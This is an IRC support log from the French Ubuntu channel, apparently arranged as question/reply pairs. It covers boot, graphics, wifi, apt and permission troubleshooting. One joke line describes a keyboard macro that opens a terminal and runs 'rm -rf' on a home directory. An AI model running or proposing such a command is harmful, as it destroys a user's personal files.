Quelqu'un s'y connait un peu en encryption?	enfin, pose plutôt simplement ta question :)
Bonjour	tu veux dire en chiffrement ?
mais c'est bô :-)	jai un pc qui a moins de deux ans
parcontre et je viens de voir ça que l'addon apparament n'est pas gratuit mais basé sur un abbo annuelle (60 j ours gratuit pour tester)...	ça fait longtemps que tu t en sers ?
cedrxl je sais pas si ça peu t'aider mais moi j'utilise exquilla (addon thunderbird) pour mes mails exchange (marche très bien).	ok je vais tester
qui est secrétaire d'ubuntu-fr en ce moment	va peut etre plutot sur -admins ou -asso pour ça  ?
bsr, qui peut me recommander un bon débrideur svp ?	mauvais canal nope
toujours pareil =(	c'est pas ce qu'essaye de faire ton script qui nécessite des droits
Quequ'un aurait une idée?	c'est possible que ça soit une histoire avec le mount. regarde du cote /etc/fstab et /etc/mtab
(j'viens d'ouvrir la "Baie de brassage" O.O Ok bon bah j'vais laisser mes compétences de tech réseau parler... XD)	pas rebooter mais relancer ta session utilisateur c'est peut-être une bonne idée
Ah cool. Avec PulseAudio, c'est possible, mais ça renvoie Skype lui même, ce qui est chiant :/	tu as moyen d'utiliser jack ET pulseaudio
Question: Pour un contrôle plus poussé de tout ce qui est audio, mis à part PulseAudio, y'a quoi ?	jack ?
Ya un truc pas trop complexe pour utiliser une appli android sur ubuntu ?	peut-être http://techapple.net/2014/05/5-best-android-emulators-linux-run-android-apps-linux-ubuntulinuxmintfedoraarchlinuxopensusemageiacentos-etc/
par contre, si de base il tourne sous Windows, tu peux installer Ubuntu dessus.	il y a un port windows 10 pour ARM
(il existe des ports plus ou moins officieux)	http://www.ubuntu.com/download/server/arm ?
Il y a des gens qui contribuent à ubuntu touch et qui pourrait m'expliquer 2-3 bricoles ?	je ne suis pas certain qu'il y ait des utilisateurs d'Ubuntu Touch ici, alors des contributeurs...
Un idee quelqu'un ?	-> VMware ? VirtualBox ?
il faut installer les addons invité je pense	oui, mais c'est lesquels ?
inspire*	laquelle ?
oups	que raconte rfkill ?
Gibb`s ya une activation logicielle via les parametres, et matérielle, souvent par une touche au clavier	M-JLuc
bonsoir, soit un disque externe usb de 1 TO qui a des secteurs défectueux, dont certains dossiers semblent illisibles, quel est la meilleure stratégie pour extraire le maximum de données en un minimum de temps, voire d'avoir une liste des fichiers corrects et une autre liste des fichiers morts  ?	photorec je pense
essaie Pitivi ou Kdenlive	relis le texte qu'il a ecrit
je les coupe dans l'éditeur avant de les mettre bout a bout. Openshot a pas supporté	tu as essayé http://cinelerra.org/2015/ ou https://www.lwks.com/ ?
est-il possible de supprimer definitivement ce message ?	allô :D
je lance juste le partitionnement etc à la mano pendant l'installation, mais une fois l'installation finish, bein j'ai déjà tout	c'est génial :)
bein imagine moi/nous, ça nous concerne meme pas à la base n_n	j'abandonne beaver c'est pas grave
x)	ça donne quoi de ton côté ?
@alias add runlevel "echo \"Pour connaitre les scripts qui se lancent au demarrage de votre Ubuntu, veuillez ouvrir un terminal avec pour contenu : for i in `find /etc/rc*.d -name S*`; do basename $i | sed -r 's/^S[0-9]+//'; done | sort | uniq\""	Done.
@alias add variantes "echo \"Voici la liste des variantes officielles d'Ubuntu : Lubuntu, Xubuntu, Kubuntu, Edubuntu, Mythbuntu, Ubuntu Studio, Ubuntu Mate, UbuntuKylin, Ubuntu GNOME.\""	Done.
donc faut l'exclure	et si on désinstallé complétement le driver 352.63
attention par contre y'a un espace en trop entre quiet et splash	c'est juste que je sais pas ce que ça fait
on garde l'idee du downgrade	http://pastebin.com/JuP66UQH
et tu pastebin s'il te plaît :)	http://pastebin.com/kA93ec1x
:/	t'as déjà pu voir une personne résoudre un probleme en voyant un plantage ? sans voir la partie debug ?
si tu as pas les ressources requises pour faire tourner l'intégraliter des applications lancees …	un jour j'ai allumé mon pc et qq seconde apres alors que j'avais rien ouvert ça a freeze
<beaver> mh, je suis curieux, mais cat .bash_history (si tu vois ton mot de passe quelque part supprime le, ça arrive …) // ça peut avoir un rapport ?	oui, ça va me permettre de voir les commandes tapées
étant perdue ... est ce que quelqu'un pourrait m'aiguiller sur les VPN sous Ubuntu 15 ? Merci d'avance	google "openvpn ubuntu"
indiana-jane@Gustav:~$	ps aux | egrep '(java|azureus|vuze)'
ça m'identifie c ça ?	non, c'est juste que tu donnes au logiciel *toutes* les permissions sur ton PC
ah ?	tu l'as installé via les dépôts Ubuntu ou via un paquet extérieur ?
et comment ?	en y écrivant vuze et en validant
niko ?	essaie de lancer "vuze" dans un terminal
je veux juste changer Sp4rKy	un dd de l'iso sur une clé sub ça marche avec les isos ubuntu
mais normalement c'est pareil dd	t'as pas l'impression d'être sur le mauvais chan ?
voilà :)	vous faites des salons aussi il me semble ?
ah comme tu veux.	tu as appris où tout ce que tu sais?
ah	j'ai mon conky qui s'ouvre plus par contre
ok la version privatrice ok, t'as un résultat concernant la commande nvidia-settings ?	http://pastebin.com/fcksRNJd
je teste cela, installtion très simple par contre va falloir que je tune un peu car j'ai un écran noir quand je me connect avec x2go	ça reste pas trop complexe ?
Bonjour, je rencontre un problème dans l'installation d'Ubuntu (ou même autres distributions comme Arch Linux). Je suis actuellement sous Windows 10 et souhaite installer pleinement Ubuntu (pas de dual boot). Hors au moment de booter, je n'ai plus rien. Par là j'entends que j'ai l'écran violet du tout début de ubuntu avec le petit clavier de l'accessibilité et le petit bonhomme. Ensuite: plus rien. Plus une seule info ne pass	sous quelle version d'Ubuntu ?
minus le temps investi pour régler optimus	pardon, oui un laptop pour pouvoir le déplacer, mais dans les faits je ne l'utilise quand secteur.
Oui, je vois que l'antispam est sérieux ici	laptop utilisé en mobilité ?
laptop utilisé en mobilité ?	oui.
gros copier/coller, antispam, ca va revenir	j'ai cru lire qu'il fallait s'orienter vers PRIME pour cela ?
j'ai cru lire qu'il fallait s'orienter vers PRIME pour cela ?	je connais pas, possible
problème avec ta carte graphique admel ?	Taz3r
bonsoir :)	oui mais un tout petit.
bon, après je suis pas forcément à 60 images secondes non plus, mais je m'en fous un peu	je me forme aux métiers de l'audio visuel. C'est le genre de technologie qui peut m'intéresser.
je pense pas, j'ai une carte graphique nvidia, sans bumblebee mais sans pilote non plus donc je tourne que sur lechip intel, etil s'en sort très bien, y compris pour de la vidéo HD	d'accord, merci.
j'ai fait une maj de ssl hier et j'ai peur que ce soit lié	une petite question. Comment savoir si c'est Unity 2D ou 3D qui fonctionne ? Et si Unity 3D en place, est-ce qu'il fonctionne de pair avec Bumblebee ?
À comprendre que Bumblebee n'est pas encore au point, ou qu'il faille attendre Wayland ?	ubuntu utilisera jamais wayland, ils créent leur propre serveur graphique, mir, qui marche pas mal déjà
ubuntu utilisera jamais wayland, ils créent leur propre serveur graphique, mir, qui marche pas mal déjà	merci ! En effet j'avais entendu parler de Mir sans trop savoir à quoi cela correspondait.
bonjour tout le monde7	c est mal de query les gens
@alias add lts "echo \"Une version LTS (long time support) a un cycle de 5 ans, une non LTS a un cycle de 9 mois. La chronologie LTS concernant les variantes officielles (Lubuntu, Xubuntu, Kubuntu, Lubuntu) ne sont pas definis.\""	Done.
ou bien est ce quand c'est le cerisier "X" qui arrive à un nombre de Y cerises qu'on tombe en LTS, nan sérieux faut cesser le LSD, y'a des gens fragiles derriere	euh oui un peu ^^
mais Xubuntu LTS c'est 3 ans, pas 5	donc dans le cas des variantes officielles, c'est quoi la politique concernant l'étiquette LTS ?
idem ;)	Xubuntu 12.04 est LTS, par contre Lubuntu 12.04, non
et Ubuntu est grand public :)	non-LTS c'est 9 mois, pas 6
(c'est juste valable pour les variantes)	ah, ben j'apprends quelque chose.
ok	oui et du coup c'est un du pipeau tout ça. Si j'ose dire.
@alias add mint "echo \"Les mises a jour de securite pour Xorg, le kernel, Firefox, le bootloader et de nombreux autres packages sont explicitement ecartees par defaut.\""	Done.
http://paste.ubuntu.com/14444980/	je supposes que tu utilises firefox non ?
tu me fais upgrade la distribution ?	non, ne t'inquiete pas ;)
aucun message pour la première commande	parfait, maintenant "sudo apt-get -f install" et ensuite "sudo apt-get -y dist-upgrade"
à la fin	ok tapes "sudo rm -rf /var/lib/apt/lists/*" et relances "sudo apt-get update"
je ne sais pas si c'est OOo qui a planté ou l'installation ou le téléchargement de paquets à mettre à jour	tu peux poster la sortie de la commande "dmesg" sur un pastebin ?
impossible de mettre à jour ,  ni en ligne de commande ni avec synaptic ni avec le logiciel de mises à jour	essayes "sudo dpkg --configure -a" et ensuite "sudo apt-get -f install"
Ok. L'environnement "GNOME Classique" d'Ubuntu pèse combien ?	Aucune idée
Sinon dans le genre y’a FirefoxOS, mais lui non plus n’est pas disponible en mode « Desktop environnement » sur lequel on peut démarrer depuis l’écran de connexion	firefoxOS est abandonné (sauf sur les smartv)
Je suis vachement surpris qu’il n’y ai quasiment aucun environnement de bureau créé avec des techno web.	ça existe aussi :p
Et puis… Les vielles habitudes et le manque de temps font que ça recommence.	ça existe il me semble https://nixos.org/ sinon tu as aussi des trucs genre etckeeper
ça existe il me semble https://nixos.org/ sinon tu as aussi des trucs genre etckeeper	je regarde ça :-)
tu peux pas refaire les confs tobiasBora ?	Je sais pas c'est pas moi qui les aient faites.
Ça va continuer à tourner ^_^	Le truc c'est qu'il doit être relancé très prochainement ^^'
http://korben.info/recuperer-des-fichiers-effaces-sous-linux-ubuntu.html	Je vais essayer...
fichier systeme ou personnel ?	C'est des fichiers de configuration de nginx
si tu n'as pas fait beaucoup d'opération	C'est pas moi qui ait écrit ce fichier, donc j'espère que la personne qui l'a écrit a une sauvegarde... Mais j'ai quelques doutes,
Y'a un moyen de retrouver ce fichier, sachant que je l'ai fait y'a a peine quelques minutes	ben t'as "cp" quoi ??
j'ai fait un "cp" qui a écrasé un fichier important.	cp -p sera désormais ton amis
par contre on a eu plein de problèmes avec les UEFI/windows 10	https://doc.ubuntu-fr.org/tutoriel/comment_changer_son_mot_de_passe_principal
oui, pour moi, je ne réinstalle pas	déjà faudrait pas leurs passer le compte root...
je suis con	tu es pas le seul, courage ;-) !
pourquoi ?	Il y a pas toujours de raison à tout :-(
vlc -I ncurses	ok merci :)
vlc aussi a une interface ncurses	ah je ne savais pas :)
va falloir que tu ailles sur ton canap ;-)	juste pour info : mocp est sympa dans le sens que c'est fait en ncurses → interface simple et intuitive.
en ligne de commande j'utilise mplayer (jamais testé moc)	pas encore, j'y vais :)
tu tiens absolument à être en ligne de commande ?	c'est beaucoup plus pratique. Mode feignasse : ssh -> lecteur en ligne de commande (on ne bouge pas de son canap)
<slystone> je n'ai rien trouvé de très clair (mais je n'ai peut-être pas assez cherché)	ok je te crois, je ne suis pas super calé sur la procédure avec l'UEFI.
slystone : c'est quoi ton petit souci ?	moc accepte de jouer un fichier mp3, mais pas un stream qui diffuse en mp3.
la plupart, c'était des windows 10	hum, bonne question. T'es allé voir les forums déjà à ce sujet ?
Bonsoir, comment puis-je connaître le driver utilisé par ma carte graphique sur une Ubuntu Live ? S'il vous plais	 lsmod -k
oui c'est stable, apres ça depend aussi beaucoup de ton hebergeur	tu as deja testé?
?	tu demandes ça sur le salon #ubuntu-fr :p
et ça ne t'oblige pas à build les locales en_GB	… Je connais ce pseudo.
la malédiction des ordinateurs	fait un memtest pour vérifier l'état de la ram
Il aurait dû te faire une erreur dès le début.	Simounet
Tu peux installer du 32bits sur une archi 64 mais pas le contraire.	Simounet
Ça ne marche pas.	Simounet
vas-y j'y suis	a lol je viens de mon connecter à # httpd apres avoir compris que c'est pas # apache
a lol je viens de mon connecter à # httpd apres avoir compris que c'est pas # apache	https://httpd.apache.org/docs/2.4/fr/mod/mod_autoindex.html#indexignore
en anglais tu pouvais aller sur #httpd mais ils te renvoient sur la doc pour des questions simples de ce genre	sur  #ubuntu-fr-offtopic ?
ou alors je suis hors sujet ici?N	je peux aider, je pense que c'ets offtopic
re, j'ai réussi à activer 2 xscreen dans nvidia-settings 1 pour chaque moniteur mais le deuxieme (X Screen 1) et noir avec une croix comme souris, je n'arrive pas à basculer une fenetre d'un écran à l'autre. Avez vous une idée?	 tu arrives a faire bouger les 2 souris ?
en réinstallation (que se soit par synaptiq ou en ligne de commande), un message d'erreur apparait : libreoffice-writer: Depends: libreoffice-base-core (= 1:5.0.2-0ubuntu1) mais la version 1:5.0.2-0ubuntu1 va être installée                     Depends: libreoffice-core (= 1:5.0.2-0ubuntu1) mais la version 1:5.0.2-0ubuntu1 va être installée	sudo apt-get install -f
je tente une MAJ de la distrib... on verra bien	j'ai cassé ma boule de cristal, sans détail, je ne peux rien pour toi!
quelqu'un pour me filer un coup de main?	c'est pas compliqué!
j'arrive pas à le trouver	tu tape cela: /join #ubuntu-fr-offtopic
désolée	#ubuntu-fr-offtopic me semble clair non?
quelqu'un maitrise jquery?	oui mais pas ici!
c'est quoi un grub?	mais pas ici!
Option         "Device" "/dev/psaux", tu devrais avoir un autre entré pour l'autre souris!	ls -l /dev/input/by-id/ ==> usb-UC-Logic_21.5__Tablet_Monitor-mouse -> ../mouse0
que dois je faire à présent ?	es os, cela ne lance pas w8?
es os, cela ne lance pas w8?	il ta faut une photo aussi de ce menu là ?
il ta faut une photo aussi de ce menu là ?	oui,
xinerama est a 0 logiquement il ne'est pas utilisé mais je le commente quand meme	bizzare, je l'impression tu ne différience pas mouse 0 et mouse 1.
est ce que je peux vous demander de l'aide?	apparemment c'est se qui charge l'os
avant en créer le fichier xorg.conf avec nvidia-xconfig http://pastebin.com/GVJbXYf8 et le xorg.conf après modification http://pastebin.com/jYkjhyZm	avec Xinerama peux pas couper les pointeurs!
si tu veux je te fais un pastebin et tu me dis ce que tu en penses mais ca ne résouds pas le souci que le xorg.conf n'est pas lu au lancement du server x	avec Xinerama peux avoir couper les pointeurs!
je comprends pas très bien l'anglais et il y a plus de gens qui n'ont pas l'air de maitriser git que le reste sur le chan github	tu peux le faire sur offtopic au pire!
je viens de forcer l'affichage du second écran dans le xorg et en effet nvidia il fait comme si il n'y avait rien. Comment forecer nvidia à utiliser le xorg.conf?	cela fait un moment que je n'ai plus touché au xorg.conf.
j'ai rajouté un InputDevice et un moniteur supplémentaire avec un Screen 0 "Screen1" dans ServerLayout etc... et au reboot y a rien qui change	tu n'a pas besoin de reboot mais juste de relancher le serveur x.
tu n'a pas besoin de reboot mais juste de relancher le serveur x.	veux tu pastebin de mon xorg d'origine et celui modifié?
(note : je ne peux pas aider pour Win 8, je ne l'ai jamais utilisé, et ne l'utiliserai probablement jamais :P)	tu as bien raison, XP et seven ne m'ont jamais fait se genre de problème
merci Marmotte	un truc comme ça ? http://papers.ch/wp-content/uploads/IMG_20100916_092429.jpg
Genre?	une idée pour revoir windows 8 au démarrage ?
une idée pour revoir windows 8 au démarrage ?	ecran noir signe bug d'affichage, pas l'absence w8. Essaye de rebooter et quand tu vois l'écran noir, fait fléche vers le bas et entré!
Tu n'a pas de liste de choix au boot?	à la base, j'ai 2 moniteurs un normal et un autre qui fonctionne avec un stylet (genre wacom) sauf que le stylet fonctionne comme une souris il est affecté au 2 moniteurs alors que je voudrais que le stylet soit affecter entièrement qu'a l'écran compatible stylet
à la base, j'ai 2 moniteurs un normal et un autre qui fonctionne avec un stylet (genre wacom) sauf que le stylet fonctionne comme une souris il est affecté au 2 moniteurs alors que je voudrais que le stylet soit affecter entièrement qu'a l'écran compatible stylet	tu as modifier le xorg ou pas?
au boot, j'ai un ecran noir avec ubuntu, ubuntu avancé et efi (qui ne fait rien)	ta machine, elle efi ou normal?
dans le bios ?	ne touche pas aux bios!
pour le moment ubuntu est le seul OS qui ce lance, donc c'est je suppose celui de ubuntu	tu as pas la liste ?
je souhaite revoir windows 8 et si possible Lubuntu	normalement grub doit de proposer un liste de disque boot ou l'un doit lancer w8!
personne n'a une autre solution pour affecter une souris à un des 2 moniteurs que j'ai?	tu veux faire quoi?
comment modifier le boot loader pour afficher windows 8 ?	quel boot loader parle tu?
j'avais pas vu	?
hum je vais voir sur mon laptop windows via un live usb, quel partition c'ets pour le boot	s'il boot, pas la peine de mettre un flag!
nous verrons, au pire je virerais Lubuntu si l'espace ne suffi pas	il te suffit d'utilise gparted avec live et redimensionner les partitions!
ce que je conseillerais, c'est restaurer efi en boot, et via ubcd sur windows, mettre linux dans le gestionnaire de démarrage de windows	cela, j'avais compris!
Quel est la partition boot de ton w8?	le problème doit être efi, et sa partitionde boot est donc sda1, mais du coup il faut une partition efi pour grub pour pouvoir boot sur windows ensuite
Ubuntu+Lxde donc 10Go est plus que suffisant	non, c'est pas suffisant!
souhaite tu un screenshoot de gparted ?	tu peux essaye, tant que reboot sous linux tu pourra toujours corriger le bug
en fait c'est pour pouvoir utiliser deux fois le même port avec deux services différents, sans rediriger/proxy	Simounet ?
tu peux plus boot dessus ? sur le même disque dur donc ?	tu fais des cartes réseaux virtuels tout simplement.
bonjour je suis sous Lubuntu 15.10x64 anciennement sous Windows 8, ubuntu démarre correctement, je vois la partition "OS" w8 mais je n'arrive pas à la réactivé, j'ai déja essayer avec boot-repair, une idée ?	qu'entends-tu par "réactiver" ?
de rien	avec une nvidia ou se trouve le xorg.conf?
Bonjour, je possède un moniteur xp-pen avec un stylet (lsusb:UC-Logic Technology Corp.). J'aimerais affecter le stylet qu'à un seul écran comment dois je faire? Merci	http://unix.stackexchange.com/questions/5544/how-to-lock-one-mouse-keyboard-pair-to-each-screen
J'ai commencer à héberger mon serveur il y'a de cela quelques jours sur mon ordinateur suite à quoi panne du sytème et carte wifi grillé ... :'(. J'ai donc pris un hébergement sur Web4all mes suite au configuration faite hier mon dns me renvois toujours à ma livebox ...	il faut modifier la conf de ton dns
c’est quoi —bind ?	https://doc.ubuntu-fr.org/tutoriel/comment_restaurer_grub#via_un_cd_ubuntu_procedure_par_chroot
Donc je pense que ça doit plutôt venir de lui	nginx devrait renvoyer un 413 Request Entity Too Large
HTTP wise, there is a limit of 100mb (you can change it using the http.max_content_length setting). Otherwise, there isn't, but, be careful not to overload the server.	On dirait pas, je l’ai passé à 1200mb comme indiqué dans ton lien sans succès,
:-(	http://elasticsearch-users.115913.n3.nabble.com/Max-request-size-td3687861.html
il n'y avait pas une histoire de navigateur qui mélangeait les cookies de différents sites, dans certaines conditions, sans le '.' final ?	oui :p
pour moi, y'a pas vraiment photo avec ça	tu sais anecore lire les données
Bonjour, j'ai un gros problème de sécurité, enfin je pensse suite à plusieurs formatages j'ai des dossier qui aparaisse sans raison sur mon ordinateur comme celui la deja-dup ...	c'est pas que tu as configuré des outils sans voir ce qu'ils faisaient ?
Je débarque au propre comme au figuré, découvrant Ubuntu et IRC. Je vais observer, tenter de comprendre puis vous poserai sans doute quelques questions dans les jours ou les semaines à  venir.	Donc je suppose que les controleur de domaine samba 4, cela ne te dire rien!
je connais pas samba en DC	mince! Je suis seul alors!
(voire winbind suivant ta conf)	je séche totalement!
Salut davlefouAMD :)	Bonjour!
Mon serveur samba ne se lance pas et n'ai aucun message dans les logs!	pas de process smbd/nmbd ?
pas de process smbd/nmbd ?	non, aucun ne tourne!
Bonjour	Bonjour :)
mais faut appuyer sur plus d'une touche pour créer une séquence comme ça	je peux appuyer sur "M1" et ça me fait "Ctrl+Alt+T [pause] rm -rf /home/piti [Enter]"
Salut ! Je compte dans peu de temps faire quelques améliorations de mon setup informatique (écran, clavier, etc...). Entre autre ajouter un second écran (bon, rien de compliqué), et acheter un clavier (car actuellement je suis sur le clavier intégré de mon pc). Au niveau compatibilité pour les claviers "gamer", comment ça se passe ? J'ai entendu parler du packet G15 mais plus maintenu depuis la 12.10, qqch du genre.	salut, tout dépend des fonctions du clavier que tu voudras exploiter
lol	plus sérieusement, je sais pas trop, mais ça semble la piste à explorer
Il semble y avoir plusieurs solutions pour la synthèse vocale. Tu en as déjà essayé une, tu peux en recommander une?	c'est pour faire quoi ? 
Bonjour Est ce que l'on peut faire un text-to-speach avec Ubuntu?	oui (faut avoir une oreille attentive)
Mais comment je créé un proxy qui bloque les pub ?	ça sera encore plus compliqué juste avant un vpn
Si,	tu as un fichier hosts
tu as un fichier hosts	Il est pas accessible sur un téléphone non rooté
je pensais faire un proxy à la base, pas au niveau du routeur parce que j’aimerai que ça marche en 4G aussi	tu peux pas installer firefox (avec adblock/ublock ou autre) sur windows 10 mobile ?
voir	krkr
ben si il y a quelqu'un qui peut t'aider tu peux toujours poser ta question qui sait..	tu peux utiliser la classe "visible-lg-block" si j'ai bien compris la question
( j'ai un systeme d'exploitation Ubuntu )	sans doute un canal qui parle de html/css (voire de bootsrap)
il y a personne qui utilise bootstrap ici?	tu veux la cacher ?
Ben une fois que j'ai désactivé plymouth, plus rien ne bloque.	c'est pas de moi hein lol : 01/04/16 00:36:27 < *flaf> par contre le désactiver dans grub m'augmente très nettement le temps de boot. 56 secondes avant d'avoir le prompt à l'écran avec plymouth contre 6  secondes sans.
systemctl start dockersystemctl : commande introuvable	tu es root ? Tu es sur quel OS ?
y'a bien une explication	uuoc!
uuoc!	j'utilise grep nope ?
dans mon exemple, tu installes openssh-server via apt-get	essaie et tu nous diras
très bien, donc côté server SSH, quel algo' est utilisé par défaut ?	ca depend du serveur
car chiffrement SSH, je m'avance pas, mais je pense que ça veut rien dire en somme	alors, ton client ssh a une liste d algos
non je peux pas	tu peux utiliser curl dans un terminal pour uploder ton fichier
hid : oui mais son firefox plante...	y a bien une commande curl qui fait ça mieux ;)
heu non, il ne télécharge pas...	ou uzbl :)
Q: Est-ce que c'est possible d'avoir à la fois son interface utilisateur en français, mais d'avoir son terminal (cli) en anglais?	tu as essayé ça ? https://askubuntu.com/questions/264283/switch-command-output-language-from-native-language-to-english
tu as essayé ça ? https://askubuntu.com/questions/264283/switch-command-output-language-from-native-language-to-english	Pas fou. Je vais essayer.
Pas fou. Je vais essayer.	j'ai ajouté « LANG=en_US.UTF-8 » à mon .bashrc et ça a l'air de marcher
j'ai ajouté « LANG=en_US.UTF-8 » à mon .bashrc et ça a l'air de marcher	Merci. Ça fonctionne.
Attendez je vais essayer de redemarrer caja	tu pourrais faire une capture d'écran ou juste dire l'erreur en entier
quelque soit la langue du terminal...	En gros, mes programmes en ligne de commande (par exemple, bower, npm, node, ou autres) me renvoient des messages en français même ceux d'erreurs. Or pour chercher sur duckduckgo c'est mieux d'avoir les messages en anglais
les commandes que tu executes sont des commandes "linux"	il veut probablement parler du man et des messages en général
hid ?	suivant ton budget, tu peux avoir qqch de bon
J'ai configurer mon FAI, d'après des tutoriels. Mais il y'a une partie importante et qui semble délicate le DNS sur une ip Dynamique. 1 Je ne sais pas si mon ip est dynamique ou fix 2 Je ne sais pas comment faire pour le DNS si c'est le cas	 tu as une livebox ?
@alias add driver "echo \"Pour connaitre le driver qu'utilise votre GPU, veuillez ouvrir un terminal, avec pour contenu cette commande : sudo lshw -c video | grep configuration\""	Done.
sudo rfkill unblock 0 t'as essayé ?	oui. $ rfkill list all me donne : "Hard blocked: yes" -> donc c'est bien au niveau de mon matériel que ça se passe ?
et dans var/log/lastlog aussi, au cas où	… xD
il faut juste que je le trouve dans l'explorateur de fichier avant de faire quoi que ce soit?	ça n'expliquera pas ce qui bloque, mais tente de réinstaller... parce que là, je ne vois pas du tout :/
Mais je pense que ce doit être ça, non ?	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
:(	je lui ai déjà demandé deux fois, mais il n'en trouve pas pour le moment ^^
"No such device"	c'est pas un switch matériel ?
je vais essayé	tu as quoi dans le var/log/faillog ?
Avec rfkill list all, il m'indique qu'il est bloqué au niveau du hardware	et tu n'as vraiment pas de switch matériel ?
et j'ai pas trouver init.txt	il y a quoi dans boot-sav ?
J'ai un peu tout cherché sur Internet, mais rien de ce que j'ai essayé ne fonctionne...	tu as tenté rfkill unblock all ?
tu as un kern.log ?	tu aurais une idée de comment je pourrais réactiver le wifi sur laptop ?
voila qu'il me trouve plus ubuntu dans media	il faut le monter d'abord
je viens d'essayer et toujours pas	au pire, tu ne peux pas réinstaller Ubuntu ? s'il est installé de cet après midi, tu n'as peut être pas grand chose à perdre dessus...
oui juste init	et avec /bin/sh ça ne fonctionne pas non plus ? :/
Quand je tape la commande "iwonfig", il devrait me retourner un truc "wlan0 ..." ? Il me retourne "wlp3s0" : c'est quand même bon pour ma carte wifi ?	lshw -C network
Héhé, ça va être fun à installer x)	il faut déjà savoir quel est ta carte, pour savoir quel paquet installer
oui comme je l'ai installé cet aprem j'ai pas suprrimé de ma clé encore	et tape d'abord : mount --bind /dev /media/ubuntu/37cb20c9-aba8-41e3-876a-481d3d38a667/dev
oui exactement pareil mais en bootant sur live usb je doit pouvoir trouvé ou il est sur le disque non?	ah, j'ai oublié les mounts bind, désolé :D
Il faudrait que j'installe les pilotes associés du coup ?	possible qu'il manque des drivers, oui
non toujours pas	tu as fait le chroot ?
Hey hey, I've got a new problem : impossible de se connecter à mon réseau Wifi :/	il a quoi de particulier, ton wifi ?
non toujours le meme message	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
en faite ça ne démarrais pas un problème que j'avais eu sur une autre machine j'ai utilisé boot-repair et au redémarrage j'ai ce message	ah
bonsoir a tous voila après avoir installé ubuntu 14.04 en dual-boot sur mon pc quand je lance j'ai ça qui s'affiche "Kernel panic - not syncing. No init found. Try passing init = option to kernel. See Linux Documentation /init.txt for guidance. " des solutions?	si c'est une install fraiche, j'en sais rien, j'ai jamais eu ce souci...
bonsoir	bonne année
mais ca bloque direct à /media/abraham avec permission pas accordée	tu es tjs sous www-data là ?
www-data	est-ce qu'à un moment donné ça coince ? (exit pour de déconnecter et reprendre ton compte de départ)
tout en bas	ensuite, tente successivement “ls -l /” puis “ls -l /media” etc. et tu remontes au fur et à mesure au niveau de /media/abraham/soryal/
http://paste.ubuntu.com/14281807/	tente de te connecter avec le compte www-data via “sudo su -s /bin/bash - www-data”
les lignes de ton log ci-dessus, t'es sûr que c'est _après_ avoir fait le chown ?	en fait reportbug marche pas, faut utiliser ubuntu-bug. Mais ce génie, quand il me demande de cliquer sur la fenetre de l'application me dit qu'il peut pas faire de rapport parce que ça concerne un logiciel non installé xD
en fait reportbug marche pas, faut utiliser ubuntu-bug. Mais ce génie, quand il me demande de cliquer sur la fenetre de l'application me dit qu'il peut pas faire de rapport parce que ça concerne un logiciel non installé xD	là je ne sais pas trop quoi te dire. Je vois que le paquet vient de la branche “partner” alors p-e que ça n'est pas pris en charge...
là je ne sais pas trop quoi te dire. Je vois que le paquet vient de la branche “partner” alors p-e que ça n'est pas pris en charge...	ça m'apprendra à utiliser des logiciels microsoft xD
because search permissions are missing on a component of the path	paste ton bout de log.
Moi, je lançais en ligne de commande “reportbug --interface=text --mode=expert”.	merci de ton aide
merci de ton aide	mais globalement avec la commande ci-dessus, tu suis les questions qui te sont posées, je pense que c'est juste au moment de l'envoi du mail que c'est un peu chiant je crois.
Pour faire un rapport de bug sous Debian (je sais pas si c'est pareil sous Ubuntu), il faut utiliser la commande reportbug et répondre aux questions etc.	le paquet est dispo dans les dépôts, je vais tenter
Et ça vient d'un dépôt officiel (apt-cache policy skype) ?	et issu  des paquets des dépôts ubuntu (si jaamis ya une diff entre ubuntu et xubuntu) pour mon pote. On a eu le problème après une MàJ noyau
Quelqu'un peut m'aider avec skype ? Un ami et moi avons le même problème. On peut se connecter à n'importe quel compte sauf le notre... qui fait crash skype !	perso, j'y connais rien du tout à skype, désolé.
perso, j'y connais rien du tout à skype, désolé.	ok ^^ Tu sais où faire un rapport de bug ? J'ai cherché sur google/duckduckgo pendant des heures sans même trouver un sujet de forum mentionnant mon problème
ok ^^ Tu sais où faire un rapport de bug ? J'ai cherché sur google/duckduckgo pendant des heures sans même trouver un sujet de forum mentionnant mon problème	ton skype, c'est issu d'un paquet debian ?
ton skype, c'est issu d'un paquet debian ?	issu de apt-get install skype sur ma xubuntu
ok	si tu regardes en fait au niveau de "other", y'a tjs rwx ou r-x sauf pour le dossier abraham qui posait problème.
mais moi, j'aurais fait un : sudo chown www-data:www-data -R repertoire	ce n'était pas nécessaire au vu de son paste.
le chown change rien	1. vérifie que ton apache tourne bien avec www-data. 2. Si le chown a rien changé, regarde dans les logs à nouveau, les messages d'erreurs seront a priori différents.
[client 127.0.0.1:49356] => le port n'est pas en 80 ?	pourrais-tu paster la sortie de “namei -movx /media/abraham/soryal” stp ?
je check	un truc sympa pour voir les droits d'un bout à l'autre c'est “namei -movx /le/rep/” (apt-get install util-linux si nécessaire).
quelqu'un peut m'aider svp ?	le message d'erreur t'indique un problème de droits sur le répertoire.
Hello, j'aurais voulu savoir ce qu'il en est de Ubuntu et systemd. En fait, je ne connais que Ubuntu Trusty qui utilise upstart. Qu'en est-il des versions suivantes d'Ubuntu ? Utilisent-elles systemd par défaut tout comme Debian ? Qu'en sera-t-il par exemple pour la prochaine LTS ? J'imagine que ça suivra le même chemin que Debian, c'est ça ?	un début de reponse ici
ça sort du cadre du support ubuntu quand même nope ?	dsl de la confusion, ubuntu server 14-04, ne sert à rien sauf à bouncer sur irc
chez ovh t'as un mode rescue par exemple	utiliser no-ip en étant chez OVH ?
désolé*	rien ne te choque ?
C'est pas genre une install non efi sur un boot paramétré en efi (ou l'inverse)	tu t'adressais à moi?
le plus chiant c les pilotes de windobne	quels pilotes ?
fastboot de window	fallait le désactiver :(
fallait le désactiver :(	 ubuntu@ubuntu:~$ sudo update-grub /usr/sbin/grub-probe: error: failed to get canonical path of `/cow'.
 ubuntu@ubuntu:~$ sudo update-grub /usr/sbin/grub-probe: error: failed to get canonical path of `/cow'.	va dans le grub : otion avancer d'ubuntu, recovery mode
windob a planté et depuis plus rien	zarb
mais j'arrive a lire avec le -ro sans soucis	en hubernation ? pourquoi ?
je teste un reboot	c'est à dire ?
c'est à dire ?	 marche pas :'(
envois le boot-info stp	http://paste.ubuntu.com/14259230/
J'arrive plus a boot sur windows	Windows combien ?
